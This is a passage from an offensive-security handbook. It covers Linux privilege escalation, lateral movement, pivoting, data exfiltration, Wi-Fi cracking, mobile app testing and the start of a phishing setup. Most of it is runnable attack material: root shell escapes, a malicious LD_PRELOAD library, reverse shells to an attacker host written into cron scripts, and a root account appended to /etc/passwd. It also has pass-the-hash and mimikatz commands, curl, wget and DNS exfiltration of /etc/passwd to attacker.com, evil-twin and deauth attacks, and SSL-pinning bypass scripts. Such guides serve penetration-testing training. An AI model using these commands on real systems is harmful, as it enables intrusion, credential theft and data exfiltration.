                <p><strong>Remediation:</strong> {finding['remediation']}</p>
            </div>
            """
        
        report += """
        </body>
        </html>
        """
        
        with open('privesc_report.html', 'w') as f:
            f.write(report)
        
        return report
    
    def run_all_checks(self):
        """Run all privilege escalation checks"""
        
        print("[*] Running privilege escalation checks...")
        
        self.check_unquoted_service_paths()
        self.check_always_install_elevated()
        self.check_privileges()
        self.check_weak_service_permissions()
        self.check_stored_credentials()
        
        print(f"[+] Found {len(self.findings)} potential privilege escalation vectors")
        
        return self.findings

# Usage
if __name__ == "__main__":
    checker = WindowsPrivEsc()
    findings = checker.run_all_checks()
    
    for finding in findings:
        print(f"\n[!] {finding['type']} ({finding['severity']})")
        print(f"    {finding['remediation']}")
    
    report = checker.generate_report()
    print("\n[+] Report saved to privesc_report.html")
```

### Linux Privilege Escalation

**Enumeration Script:**

```bash
#!/bin/bash
# Linux Privilege Escalation Enumeration
# LinEnum alternative

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Linux Privilege Escalation Enumeration${NC}"

# System Information
echo -e "\n${YELLOW}[+] System Information${NC}"
uname -a
cat /etc/issue
cat /etc/*-release
hostname

# User Information
echo -e "\n${YELLOW}[+] User Information${NC}"
whoami
id
cat /etc/passwd
cat /etc/group
cat /etc/shadow 2>/dev/null

# Check sudo permissions
echo -e "\n${YELLOW}[+] Sudo Permissions${NC}"
sudo -l

# SUID/SGID Files
echo -e "\n${YELLOW}[+] SUID/SGID Files${NC}"
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable files
echo -e "\n${YELLOW}[+] World-Writable Files${NC}"
find / -perm -2 -type f 2>/dev/null | grep -v '/proc'

# Capabilities
echo -e "\n${YELLOW}[+] File Capabilities${NC}"
getcap -r / 2>/dev/null

# Cron Jobs
echo -e "\n${YELLOW}[+] Cron Jobs${NC}"
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron*/* 2>/dev/null
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs 2>/dev/null

# Password Hunting
echo -e "\n${YELLOW}[+] Searching for Passwords${NC}"
grep -r -i "password" /etc/ 2>/dev/null | grep -v "Binary"
grep -r -i "password" /home/ 2>/dev/null | grep -v "Binary"
find / -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# SSH Keys
echo -e "\n${YELLOW}[+] SSH Keys${NC}"
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null

# Network Information
echo -e "\n${YELLOW}[+] Network Information${NC}"
ifconfig -a 2>/dev/null || ip a
route -n 2>/dev/null || ip route
arp -a 2>/dev/null || ip neigh
netstat -antup 2>/dev/null || ss -antup

# Running Processes
echo -e "\n${YELLOW}[+] Running Processes${NC}"
ps aux
ps -ef

# Processes running as root
echo -e "\n${YELLOW}[+] Root Processes${NC}"
ps aux | grep root

# Services
echo -e "\n${YELLOW}[+] Services${NC}"
systemctl list-units --type=service 2>/dev/null || service --status-all 2>/dev/null

# Installed Software
echo -e "\n${YELLOW}[+] Installed Software${NC}"
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null

# Check for vulnerable software versions
echo -e "\n${YELLOW}[+] Checking for Vulnerable Software${NC}"
# Check kernel version
uname -r

# Environment Variables
echo -e "\n${YELLOW}[+] Environment Variables${NC}"
env
cat /etc/environment 2>/dev/null

# Docker
echo -e "\n${YELLOW}[+] Docker${NC}"
docker ps 2>/dev/null
groups | grep -i docker && echo -e "${RED}[!] User is in docker group${NC}"

# Mounted Filesystems
echo -e "\n${YELLOW}[+] Mounted Filesystems${NC}"
mount
cat /etc/fstab

# Writable /etc/passwd
echo -e "\n${YELLOW}[+] Checking /etc/passwd Permissions${NC}"
ls -la /etc/passwd
test -w /etc/passwd && echo -e "${RED}[!] /etc/passwd is writable!${NC}"

# Check for NFS shares
echo -e "\n${YELLOW}[+] NFS Shares${NC}"
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# Kernel Exploits
echo -e "\n${YELLOW}[+] Kernel Version (Check for Exploits)${NC}"
uname -a
cat /proc/version

echo -e "\n${GREEN}[*] Enumeration Complete!${NC}"
```

**Common Linux Privilege Escalation Techniques:**

```bash
#!/bin/bash
# Linux Privilege Escalation Techniques

# Technique 1: SUID Exploitation
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# - nmap (older versions)
nmap --interactive
!sh

# - find
find / -exec /bin/sh \; -quit

# - vim
vim -c ':!/bin/sh'

# - less
less /etc/hosts
!/bin/sh

# - more
more /etc/hosts
!/bin/sh

# - nano
nano
^R^X
reset; sh 1>&0 2>&0

# - cp
LFILE=/etc/shadow
cp "$LFILE" /tmp/shadow
# Modify shadow file, then:
cp /tmp/shadow "$LFILE"

# Technique 2: Sudo Misconfigurations
# Check sudo permissions
sudo -l

# Examples of exploitable sudo configs:

# 2a. sudo vim
sudo vim -c ':!/bin/sh'

# 2b. sudo find
sudo find / -exec /bin/sh \; -quit

# 2c. sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 2d. sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# 2e. sudo perl
sudo perl -e 'exec "/bin/sh";'

# 2f. sudo less
sudo less /etc/hosts
!/bin/sh

# 2g. sudo env (if allowed to set LD_PRELOAD)
# Create malicious library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so find

# Technique 3: Capabilities
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:

# cap_setuid
# If python has cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search
# Can read any file

# Technique 4: Cron Job Exploitation
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# If cron job runs script that you can modify:
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /path/to/script.sh

# If cron job runs with wildcard:
# Example: tar czf /backup/*.gz /var/www/html
# Exploit using tar checkpoint
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> shell.sh
chmod +x shell.sh

# Technique 5: Writable /etc/passwd
# Check if /etc/passwd is writable
ls -la /etc/passwd

# If writable, add new root user
openssl passwd -1 -salt salt password123
# Output: $1$salt$hash

echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# Technique 6: Docker Group
# If user is in docker group
groups | grep docker

# Escape to host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Technique 7: Kernel Exploits
# Check kernel version
uname -a

# Common kernel exploits:
# - DirtyCow (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9
# - Dirty Pipe (CVE-2022-0847) - Linux Kernel 5.8 < 5.17
# - PwnKit (CVE-2021-4034) - Polkit

# DirtyCow example
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123

# Technique 8: NFS no_root_squash
# Check /etc/exports
cat /etc/exports

# If NFS export has no_root_squash:
# From attacker machine:
showmount -e target_ip
mount -o rw,vers=3 target_ip:/share /mnt
# Create SUID binary on share
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash

# On target:
/share/rootbash -p

# Technique 9: PATH Hijacking
# If sudo command doesn't use absolute path

# Check sudo config
sudo -l
# Example: (root) NOPASSWD: /usr/bin/script.sh
# If script.sh calls 'ls' without absolute path

# Create malicious ls
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls

# Add /tmp to PATH
export PATH=/tmp:$PATH

# Run sudo command
sudo /usr/bin/script.sh

# Technique 10: LD_PRELOAD
# If LD_PRELOAD is allowed in sudo

# Create malicious library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so find
```

**Automated Linux Privilege Escalation:**

```bash
#!/bin/bash
# Automated tools for Linux privilege escalation

# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download and run
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration (LSE)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l 2

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# pspy (process monitoring without root)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

### Lateral Movement

**Techniques for Moving Through Network:**

```bash
#!/bin/bash
# Lateral Movement Techniques

# Technique 1: Pass-the-Hash (Windows)
# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H ntlm_hash

# Execute commands on multiple hosts
crackmapexec smb 192.168.1.0/24 -u admin -H hash -x "whoami"

# Using Impacket
psexec.py -hashes :ntlm_hash domain/user@target_ip

# Technique 2: Pass-the-Ticket (Windows)
# Export Kerberos ticket
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Access resources
dir \\target\C$

# Technique 3: WMI (Windows)
# Using wmiexec
wmiexec.py domain/user:password@target_ip

# Using PowerShell
$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName target_host -Credential $Cred

# Technique 4: PSExec
# Sysinternals PSExec
psexec.exe \\target_host -u domain\user -p password cmd.exe

# Impacket psexec
psexec.py domain/user:password@target_ip

# Technique 5: RDP
# Enable RDP remotely
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Connect
xfreerdp /u:user /p:password /v:target_ip

# Technique 6: PowerShell Remoting
# Enable PS Remoting
Enable-PSRemoting -Force

# Create session
$session = New-PSSession -ComputerName target_host -Credential $cred

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }

# Technique 7: SSH (Linux)
# With password
sshpass -p 'password' ssh user@target_host

# With key
ssh -i id_rsa user@target_host

# SSH tunneling for pivoting
ssh -D 9050 user@pivot_host  # SOCKS proxy
ssh -L 8080:internal_host:80 user@pivot_host  # Port forwarding
```

**Pivoting and Tunneling:**

```bash
#!/bin/bash
# Pivoting and Tunneling Techniques

# SSH Dynamic Port Forwarding (SOCKS Proxy)
ssh -D 9050 user@pivot_host

# Use with proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT 172.16.0.0/24

# SSH Local Port Forwarding
ssh -L 8080:internal_server:80 user@pivot_host
# Access http://localhost:8080

# SSH Remote Port Forwarding
ssh -R 8080:localhost:80 user@attacker_machine
# Exposes local port 80 on attacker machine port 8080

# Metasploit Pivoting
# Add route through session
meterpreter > run autoroute -s 172.16.0.0/24
# Or from console:
route add 172.16.0.0 255.255.255.0 1

# Port forwarding in Metterpreter
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.0.10

# SOCKS proxy with Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run -j

# Chisel (Fast TCP/UDP tunnel)
# On attacker machine (server)
./chisel server -p 8080 --reverse

# On pivot machine (client)
./chisel client attacker_ip:8080 R:socks

# Use with proxychains
proxychains nmap -sT target_ip

# socat Tunneling
# Forward port
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# ligolo-ng (Advanced tunneling)
# On attacker
./proxy -selfcert

# On pivot
./agent -connect attacker_ip:11601 -ignore-cert

# Add route
sudo ip route add 172.16.0.0/24 dev ligolo

# plink.exe (Windows SSH client for tunneling)
plink.exe -l user -pw password -R 8080:127.0.0.1:8080 attacker_ip

# NetSH port forwarding (Windows)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.0.10
```

### Data Exfiltration

**Exfiltration Techniques:**

```bash
#!/bin/bash
# Data Exfiltration Methods

# Method 1: HTTP/HTTPS
# Using curl
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload

# Using wget
wget --post-file=/etc/passwd http://attacker.com/upload

# Python HTTP server (receiving end)
python3 -m http.server 8080

# Method 2: DNS Exfiltration
# Encode file and send via DNS queries
cat /etc/passwd | xxd -p | while read line; do
    dig $line.attacker.com
done

# Method 3: ICMP Exfiltration
# Using hping3
hping3 -1 -d 1000 --file /etc/passwd attacker_ip

# Method 4: Email
# Using sendmail
cat /etc/passwd | mail -s "Data" attacker@evil.com

# Method 5: Cloud Storage
# AWS S3
aws s3 cp /etc/passwd s3://bucket/passwd

# Google Drive (with rclone)
rclone copy /etc/passwd gdrive:exfil/

# Method 6: Encrypted Exfiltration
# Encrypt before sending
openssl enc -aes-256-cbc -salt -in /etc/passwd -out passwd.enc -k password
curl -X POST -F "file=@passwd.enc" http://attacker.com/upload

# Method 7: Steganography
# Hide data in image
steghide embed -cf image.jpg -ef /etc/passwd

# Method 8: Slow Exfiltration (Evade DLP)
# Send small chunks over time
split -b 100 /etc/passwd chunk_
for file in chunk_*; do
    curl -X POST -F "file=@$file" http://attacker.com/upload
    sleep 60
done
```

[Continuing with wireless, mobile, social engineering, and C2 frameworks...]
## 2.6 Wireless Network Security

### Wi-Fi Security Overview

**Wireless Protocols:**

```markdown
| Protocol | Encryption | Key Length | Vulnerabilities | Status |
|----------|------------|------------|----------------|--------|
| **WEP** | RC4 | 40/104-bit | Weak IV, Key recovery | Broken |
| **WPA** | TKIP/RC4 | 128-bit | TKIP vulnerabilities | Deprecated |
| **WPA2-PSK** | AES-CCMP | 128-bit | Weak passwords, KRACK | Current |
| **WPA2-Enterprise** | AES-CCMP + 802.1X | 128-bit | Misconfiguration | Secure |
| **WPA3** | AES-GCMP | 128/192-bit | Dragonblood (patched) | Most Secure |
```

### Aircrack-ng Suite Complete Guide

**Installation and Setup:**

```bash
#!/bin/bash
# Aircrack-ng Suite Installation and Configuration

# Install on Kali Linux (pre-installed)
apt-get update
apt-get install aircrack-ng

# Install on Ubuntu/Debian
sudo apt-get install aircrack-ng

# Check wireless interfaces
iwconfig
airmon-ng

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Verify monitor mode
iwconfig wlan0mon
```

**WPA/WPA2 Handshake Capture and Cracking:**

```bash
#!/bin/bash
# Complete WPA2-PSK Attack Workflow

INTERFACE="wlan0mon"
BSSID="00:11:22:33:44:55"  # Target AP MAC
CHANNEL="6"
ESSID="TargetNetwork"

echo "[*] Starting WPA2-PSK attack"

# Step 1: Discover networks
echo "[+] Discovering networks..."
sudo airodump-ng $INTERFACE

# Step 2: Target specific network
echo "[+] Targeting $ESSID on channel $CHANNEL"
sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write capture $INTERFACE

# Step 3: Deauthenticate client to capture handshake
# In another terminal:
sudo aireplay-ng --deauth 10 -a $BSSID $INTERFACE

# Or target specific client:
sudo aireplay-ng --deauth 10 -a $BSSID -c CLIENT_MAC $INTERFACE

# Step 4: Verify handshake capture
# Look for "WPA handshake" message in airodump-ng
# Or check manually:
sudo aircrack-ng -w /dev/null capture-01.cap

# Step 5: Crack the handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Advanced cracking with rules
sudo aircrack-ng -w wordlist.txt -r rules.txt capture-01.cap

# Using hashcat for faster cracking
# Convert capture to hashcat format
sudo aircrack-ng capture-01.cap -J capture
# Creates capture.hccapx

# Crack with hashcat
hashcat -m 22000 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 -a 0 capture.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (for known password patterns)
hashcat -m 22000 -a 3 capture.hccapx ?u?l?l?l?l?d?d?d?d
# Pattern: Uppercase + 4 lowercase + 4 digits
```

**PMKID Attack (No Client Required):**

```bash
#!/bin/bash
# PMKID Attack - Crack WPA2 without waiting for handshake

INTERFACE="wlan0mon"
BSSID="00:11:22:33:44:55"

echo "[*] PMKID Attack"

# Capture PMKID
sudo hcxdumptool -i $INTERFACE -o capture.pcapng --enable_status=1

# Or target specific BSSID
sudo hcxdumptool -i $INTERFACE -o capture.pcapng --filterlist_ap=targets.txt --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hash capture.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.hash /usr/share/wordlists/rockyou.txt

# Success if password found!
```

**WPS Attacks:**

```bash
#!/bin/bash
# WPS (Wi-Fi Protected Setup) Attacks

INTERFACE="wlan0mon"
BSSID="00:11:22:33:44:55"

# Check for WPS-enabled networks
sudo wash -i $INTERFACE

# Reaver - Online brute force attack
sudo reaver -i $INTERFACE -b $BSSID -vv

# With delay to avoid detection
sudo reaver -i $INTERFACE -b $BSSID -d 2 -T 0.5 -vv

# Pixie Dust attack (offline)
sudo reaver -i $INTERFACE -b $BSSID -vv -K

# Or using wifite2 (automated)
sudo wifite --wps
```

**Evil Twin Attack:**

```bash
#!/bin/bash
# Evil Twin AP Attack

INTERFACE="wlan0mon"
INTERNET_INTERFACE="eth0"

# Install required tools
sudo apt-get install hostapd dnsmasq

# Create fake AP configuration
cat > /tmp/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Create DHCP configuration
cat > /tmp/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Configure IP
sudo ifconfig $INTERFACE 10.0.0.1 netmask 255.255.255.0

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT
sudo iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE
sudo iptables -A FORWARD -i $INTERFACE -o $INTERNET_INTERFACE -j ACCEPT

# Start services
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# Monitor connections
tail -f /var/log/syslog | grep dnsmasq

# Capture credentials with fake portal (use wifiphisher)
sudo wifiphisher -i $INTERFACE
```

**Wireless Reconnaissance Tools:**

```bash
#!/bin/bash
# Advanced Wireless Reconnaissance

# Kismet - Wireless network detector
sudo kismet -c wlan0mon

# Wireshark for packet analysis
sudo wireshark -i wlan0mon

# Filter for specific protocols:
# - WPA handshakes: eapol
# - Beacons: wlan.fc.type_subtype == 0x08
# - Probe requests: wlan.fc.type_subtype == 0x04

# Discover hidden SSIDs
sudo airodump-ng wlan0mon

# Wait for probe responses or deauth clients:
sudo aireplay-ng --deauth 5 -a BSSID wlan0mon

# Bluetooth reconnaissance
sudo hcitool scan
sudo hcitool info MAC_ADDRESS

# Bluetooth exploitation
sudo rfcomm connect 0 MAC_ADDRESS
```

## 2.7 Mobile Application Security

### Android Security Testing

**APK Analysis Workflow:**

```bash
#!/bin/bash
# Android APK Analysis

APK_FILE="app.apk"

echo "[*] Android APK Analysis Workflow"

# Step 1: Decompile APK with JADX
echo "[+] Decompiling with JADX..."
jadx -d output_dir $APK_FILE

# Or use JADX-GUI for graphical interface
jadx-gui $APK_FILE

# Step 2: Extract APK contents with apktool
echo "[+] Extracting with apktool..."
apktool d $APK_FILE -o extracted

# Step 3: Analyze AndroidManifest.xml
echo "[+] Analyzing AndroidManifest.xml..."
cat extracted/AndroidManifest.xml

# Check for security issues:
# - Exported components
grep -A 5 "android:exported=\"true\"" extracted/AndroidManifest.xml

# - Debuggable flag
grep "android:debuggable=\"true\"" extracted/AndroidManifest.xml

# - Backup allowed
grep "android:allowBackup=\"true\"" extracted/AndroidManifest.xml

# - Cleartext traffic
grep "android:usesCleartextTraffic=\"true\"" extracted/AndroidManifest.xml

# Step 4: Search for sensitive data
echo "[+] Searching for hardcoded secrets..."
grep -r -i "password\|api_key\|secret\|token" output_dir/sources/
grep -r "http://" output_dir/sources/ # Insecure HTTP

# Search for crypto issues
grep -r "DES\|MD5\|SHA1" output_dir/sources/

# Step 5: Analyze network security config
cat extracted/res/xml/network_security_config.xml

# Step 6: Check for SQL injection
grep -r "rawQuery\|execSQL" output_dir/sources/

# Step 7: Look for WebView vulnerabilities
grep -r "setJavaScriptEnabled\|addJavascriptInterface" output_dir/sources/

# Step 8: Analyze native libraries
echo "[+] Native libraries..."
ls -la extracted/lib/

# Use strings on .so files
strings extracted/lib/arm64-v8a/*.so | grep -i "password\|key\|token"

# Step 9: Certificate pinning check
grep -r "CertificatePinner\|TrustManager" output_dir/sources/
```

**Dynamic Analysis with Frida:**

```python
#!/usr/bin/env python3
"""
Frida - Dynamic instrumentation for Android
"""

import frida
import sys

# Frida script to bypass SSL pinning
ssl_bypass_script = """
Java.perform(function() {
    // Hook SSLContext
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[+] Bypassing SSL Pinning');
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var EmptyTrustManager = Java.registerClass({
            name: 'com.custom.EmptyTrustManager',
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        this.init(keyManager, [EmptyTrustManager.$new()], secureRandom);
    };
    
    // Hook OkHttp
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(str) {
            console.log('[+] Bypassing OkHttp SSL Pinning for: ' + str);
            return;
        };
    } catch(e) {}
    
    console.log('[+] SSL Pinning bypass complete');
});
"""

# Frida script to log method calls
method_trace_script = """
Java.perform(function() {
    var targetClass = Java.use('com.example.app.MainActivity');
    
    targetClass.sensitiveMethod.implementation = function(arg) {
        console.log('[+] sensitiveMethod called with: ' + arg);
        var result = this.sensitiveMethod(arg);
        console.log('[+] sensitiveMethod returned: ' + result);
        return result;
    };
});
"""

# Frida script to bypass root detection
root_bypass_script = """
Java.perform(function() {
    // Common root detection methods
    
    // Method 1: File checks
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.includes('su') || path.includes('magisk')) {
            console.log('[+] Hiding root file: ' + path);
            return false;
        }
        return this.exists();
    };
    
    // Method 2: Runtime.exec
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.includes('su') || cmd.includes('which')) {
            console.log('[+] Blocking command: ' + cmd);
            throw new Error('Command not found');
        }
        return this.exec(cmd);
    };
    
    // Method 3: Build.TAGS
    var Build = Java.use('android.os.Build');
    Build.TAGS.value = 'release-keys';
    
    console.log('[+] Root detection bypass active');
});
"""

def on_message(message, data):
    """Handle messages from Frida script"""
    if message['type'] == 'send':
        print(f"[*] {message['payload']}")
    elif message['type'] == 'error':
        print(f"[!] {message['stack']}")

def main():
    # Connect to device
    device = frida.get_usb_device()
    
    # Attach to app (replace with package name)
    pid = device.spawn(["com.example.app"])
    session = device.attach(pid)
    
    # Load script
    script = session.create_script(ssl_bypass_script)
    script.on('message', on_message)
    script.load()
    
    # Resume app
    device.resume(pid)
    
    print("[*] Press Ctrl+C to exit")
    sys.stdin.read()

if __name__ == '__main__':
    main()
```

**MobSF Automated Analysis:**

```bash
#!/bin/bash
# Mobile Security Framework (MobSF) - Automated Analysis

# Install MobSF with Docker
docker pull opensecurity/mobile-security-framework-mobsf

# Run MobSF
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Access web interface: http://localhost:8000

# Upload APK for automated analysis
# MobSF will:
# - Decompile APK
# - Analyze manifest
# - Check permissions
# - Find hardcoded secrets
# - Identify insecure crypto
# - Test for common vulnerabilities
# - Generate comprehensive report

# API usage for automation
curl -F "file=@app.apk" http://localhost:8000/api/v1/upload

# Get scan results
curl http://localhost:8000/api/v1/scan -d "hash=SCAN_HASH"
```

### iOS Security Testing

**IPA Analysis:**

```bash
#!/bin/bash
# iOS IPA Analysis

IPA_FILE="app.ipa"

echo "[*] iOS IPA Analysis"

# Extract IPA
unzip $IPA_FILE -d extracted_ipa

# Navigate to app bundle
cd extracted_ipa/Payload/*.app

# View Info.plist
plutil -p Info.plist

# Check for security features
grep -i "NSAllowsArbitraryLoads" Info.plist  # ATS bypass
grep -i "UIFileSharingEnabled" Info.plist    # File sharing

# Extract encrypted binary
otool -l AppBinary | grep -A 4 LC_ENCRYPTION_INFO

# Decrypt with Clutch (on jailbroken device)
Clutch -d com.example.app

# Class dump
class-dump AppBinary > classes.txt

# Strings analysis
strings AppBinary | grep -i "password\|api\|key\|token"

# Check for debugging symbols
nm AppBinary | grep -i debug

# Hopper Disassembler (commercial tool)
# hopper -e AppBinary
```

**Objection - Runtime Mobile Exploration:**

```bash
#!/bin/bash
# Objection - Runtime Mobile Exploration Tool

# Install objection
pip3 install objection

# Android usage
objection -g com.example.app explore

# Inside objection shell:
# - android hooking list activities
# - android hooking list services
# - android hooking watch class com.example.app.MainActivity
# - android intent launch_activity com.example.app.MainActivity
# - android keystore list
# - android sslpinning disable
# - memory dump all /tmp/dump
# - jobs list

# iOS usage
objection -g "App Name" explore

# iOS commands:
# - ios hooking list classes
# - ios hooking watch method "-[ClassName methodName:]"
# - ios keychain dump
# - ios nsurlsession sslpinning disable
# - ios cookies get
# - ios pasteboard monitor
```

### Mobile OWASP Top 10

```markdown
## Mobile OWASP Top 10 (2024)

### M1: Improper Platform Usage
**Risk:** Misuse of platform features or failure to use security controls
**Example:** Not using iOS Keychain for sensitive data
**Test:** Review code for proper use of platform security features

### M2: Insecure Data Storage
**Risk:** Sensitive data stored insecurely on device
**Example:** Storing passwords in SharedPreferences (Android)
**Test:** 
- Check SQLite databases: `adb pull /data/data/com.app/databases/`
- Check SharedPreferences: `/data/data/com.app/shared_prefs/`
- Check external storage
**Prevention:** Use Android Keystore, iOS Keychain, encryption

### M3: Insecure Communication
**Risk:** Data transmitted without encryption
**Example:** Using HTTP instead of HTTPS
**Test:** Intercept traffic with Burp Suite
**Prevention:** Use TLS, implement certificate pinning

### M4: Insecure Authentication
**Risk:** Weak authentication implementation
**Example:** Client-side authentication bypass
**Test:** Analyze authentication logic in decompiled code
**Prevention:** Server-side validation, strong session management

### M5: Insufficient Cryptography
**Risk:** Weak encryption algorithms
**Example:** Using DES, MD5, or custom crypto
**Test:** Search for crypto implementations in code
**Prevention:** Use AES-256, SHA-256, bcrypt

### M6: Insecure Authorization
**Risk:** Authorization flaws allowing privilege escalation
**Example:** IDOR in API endpoints
**Test:** Test API endpoints with different user tokens
**Prevention:** Implement proper RBAC

### M7: Client Code Quality
**Risk:** Code-level vulnerabilities
**Example:** Buffer overflows in native code
**Test:** Static analysis with MobSF
**Prevention:** Input validation, secure coding practices

### M8: Code Tampering
**Risk:** App modification or reverse engineering
**Example:** Removing license checks
**Test:** Modify APK and resign
**Prevention:** Code obfuscation, integrity checks

### M9: Reverse Engineering
**Risk:** Exposure of algorithms and secrets
**Example:** Extracting API keys from decompiled code
**Test:** Decompile with JADX, analyze strings
**Prevention:** Obfuscation, root/jailbreak detection

### M10: Extraneous Functionality
**Risk:** Hidden backdoors or development features
**Example:** Debug logs in production
**Test:** Check for test/debug code
**Prevention:** Remove before release
```

## 2.8 Social Engineering

### Psychological Principles

**Key Concepts:**

```markdown
## Social Engineering Principles

### 1. Authority
People tend to obey authority figures
**Example:** Impersonating IT support or executive

### 2. Urgency/Scarcity
Creating time pressure reduces critical thinking
**Example:** "Your account will be locked in 1 hour"

### 3. Social Proof
People follow what others are doing
**Example:** "Everyone in your department has already updated"

### 4. Liking/Rapport
People help those they like
**Example:** Building relationship before request

### 5. Reciprocity
People feel obligated to return favors
**Example:** Offering "help" first, then asking for info

### 6. Commitment/Consistency
People stick to their commitments
**Example:** Getting small "yes" before big request
```

### Phishing Campaigns with Gophish

**Gophish Setup:**

```bash
#!/bin/bash
# Gophish - Open-Source Phishing Framework

# Download Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish-v0.12.1-linux-64bit

# Edit config.json for custom settings
cat > config.json << EOF
{
  "admin_server": {
